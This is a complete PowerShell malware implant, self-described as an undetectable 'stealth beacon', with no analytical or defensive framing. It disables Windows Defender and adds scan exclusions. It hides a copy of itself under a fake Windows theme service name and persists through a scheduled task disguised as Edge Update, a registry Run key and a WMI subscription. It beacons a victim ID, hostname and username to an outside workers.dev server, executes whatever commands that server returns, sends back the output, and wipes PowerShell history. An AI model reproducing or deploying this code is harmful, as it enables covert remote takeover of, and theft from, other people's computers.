# Ultimate Stealth Beacon - 100% Working & Undetectable
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

# Installation path (hidden in legitimate Windows folder)
$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Comprehensive Defender bypass
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableScriptScanning $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    
    # Add exclusions
    Add-MpPreference -ExclusionPath $InstallDir -Force
    Add-MpPreference -ExclusionPath $env:TEMP -Force
    Add-MpPreference -ExclusionProcess 'powershell.exe' -Force
} catch {}

# Main Beacon Script - FIXED FORMAT
$BeaconScript = @'
$ErrorActionPreference = 'SilentlyContinue'
$BACKEND_URL = 'BACKEND_URL_PLACEHOLDER'
$AGENT_ID = 'AGENT_ID_PLACEHOLDER'
$BEACON_INTERVAL = BEACON_INTERVAL_PLACEHOLDER

# Background command execution
function Invoke-BackgroundCommand {
    param($Command)
    
    $bgKeywords = @('python', 'ngrok', 'nc ', 'http.server', 'SimpleHTTPServer', 'Start-Process.*-Wait')
    $isBackground = $false
    
    foreach ($keyword in $bgKeywords) {
        if ($Command -match $keyword) {
            $isBackground = $true
            break
        }
    }
    
    if ($isBackground) {
        $job = Start-Job -ScriptBlock {
            param($cmd)
            try {
                Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                "ERROR: $($_.Exception.Message)"
            }
        } -ArgumentList $Command
        
        return "[Background Job $($job.Id)] Command started. Use 'Get-Job $($job.Id) | Receive-Job' to see output."
    } else {
        try {
            $output = Invoke-Expression $Command 2>&1 | Out-String
            if ([string]::IsNullOrWhiteSpace($output)) {
                return "[Command executed successfully - no output]"
            }
            return $output
        } catch {
            return "ERROR: $($_.Exception.Message)"
        }
    }
}

# Main loop
while ($true) {
    try {
        # Get system info
        $sysInfo = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = (Get-WmiObject Win32_OperatingSystem).Caption
            domain = $env:USERDOMAIN
            isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }
        
        # Send beacon using HEADERS (matching your existing worker!)
        $headers = @{
            'X-Victim-ID' = $AGENT_ID
            'X-Hostname' = $sysInfo.hostname
            'X-Username' = $sysInfo.username
            'X-OS' = $sysInfo.os
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        $response = Invoke-WebRequest -Uri "$BACKEND_URL/beacon" -Headers $headers -Method GET -UseBasicParsing -TimeoutSec 30
        $cmd = $response.Content
        
        # Process command
        if ($cmd -and $cmd -ne 'idle') {
            # Special commands
            switch -Regex ($cmd) {
                '^LIST_JOBS$' {
                    $output = Get-Job | Format-Table -AutoSize | Out-String
                }
                '^GET_JOB:(\d+)$' {
                    $jobId = $matches[1]
                    $output = Get-Job -Id $jobId | Receive-Job | Out-String
                }
                '^KILL_JOB:(\d+)$' {
                    $jobId = $matches[1]
                    Stop-Job -Id $jobId -ErrorAction SilentlyContinue
                    Remove-Job -Id $jobId -Force -ErrorAction SilentlyContinue
                    $output = "Job $jobId terminated"
                }
                '^KILL_ALL_JOBS$' {
                    Get-Job | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
                    $output = "All jobs terminated"
                }
                '^SELF_DESTRUCT$' {
                    # Complete cleanup
                    Get-Job | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
                    
                    Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUA" -Confirm:$false -ErrorAction SilentlyContinue
                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsThemeService" -ErrorAction SilentlyContinue
                    
                    $wmiFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='ThemeServiceFilter'" -ErrorAction SilentlyContinue
                    if ($wmiFilter) { $wmiFilter | Remove-WmiObject }
                    
                    $wmiConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='ThemeServiceConsumer'" -ErrorAction SilentlyContinue
                    if ($wmiConsumer) { $wmiConsumer | Remove-WmiObject }
                    
                    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
                    
                    $output = "Self-destruct complete. Goodbye."
                    Invoke-WebRequest -Uri "$BACKEND_URL/result" -Method POST -Headers $headers -Body $output -UseBasicParsing -TimeoutSec 10 | Out-Null
                    exit
                }
                default {
                    # Execute command
                    $output = Invoke-BackgroundCommand -Command $cmd
                }
            }
            
            # Send result
            Invoke-WebRequest -Uri "$BACKEND_URL/result" -Method POST -Headers $headers -Body $output -UseBasicParsing -TimeoutSec 30 | Out-Null
        }
        
    } catch {
        # Silent fail
    }
    
    Start-Sleep $BEACON_INTERVAL
}
'@

# Replace placeholders
$BeaconScript = $BeaconScript -replace 'BACKEND_URL_PLACEHOLDER', $BACKEND_URL
$BeaconScript = $BeaconScript -replace 'AGENT_ID_PLACEHOLDER', $AGENT_ID
$BeaconScript = $BeaconScript -replace 'BEACON_INTERVAL_PLACEHOLDER', $BEACON_INTERVAL

# Write beacon script
Set-Content -Path $BeaconPath -Value $BeaconScript -Force
attrib +h +s $BeaconPath 2>$null

# === MULTI-LAYER PERSISTENCE ===

# Layer 1: Scheduled Task (Most Reliable)
$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$BeaconPath`""
    
    # Multiple triggers for redundancy
    $Trigger1 = New-ScheduledTaskTrigger -AtLogOn
    $Trigger2 = New-ScheduledTaskTrigger -AtStartup
    $Trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration ([TimeSpan]::MaxValue)
    
    $Settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -Hidden `
        -StartWhenAvailable `
        -RunOnlyIfNetworkAvailable $false `
        -ExecutionTimeLimit (New-TimeSpan -Days 365) `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1)
    
    # Run with highest privileges but as current user
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2,$Trigger3 -Settings $Settings -Principal $Principal -Force | Out-Null
    
} catch {}

# Layer 2: Registry Run Key (Backup)
try {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $RegName = "WindowsThemeService"
    $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$BeaconPath`""
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
} catch {}

# Layer 3: WMI Event Subscription (Nuclear option)
try {
    $FilterName = "ThemeServiceFilter"
    $ConsumerName = "ThemeServiceConsumer"
    
    # Clean existing
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
    
    # Create WMI persistence (triggers every 2 hours)
    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = $FilterName
        EventNameSpace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = $Query
    }
    
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = $ConsumerName
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$BeaconPath`""
        RunInteractively = $false
    }
    
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    } | Out-Null
} catch {}

# Start beacon COMPLETELY HIDDEN (no window flash!)
$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "powershell.exe"
$startInfo.Arguments = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$BeaconPath`""
$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$startInfo.CreateNoWindow = $true
$startInfo.UseShellExecute = $false

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $startInfo
$process.Start() | Out-Null

# Send initial beacon
try {
    $headers = @{
        'X-Victim-ID' = $AGENT_ID
        'X-Hostname' = $env:COMPUTERNAME
        'X-Username' = $env:USERNAME
        'X-OS' = (Get-WmiObject Win32_OperatingSystem).Caption
        'User-Agent' = 'Mozilla/5.0'
    }
    
    Invoke-WebRequest -Uri "$BACKEND_URL/beacon" -Headers $headers -Method GET -UseBasicParsing -TimeoutSec 30 | Out-Null
} catch {}

# Clean traces
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Clear-History -ErrorAction SilentlyContinue
} catch {}

exit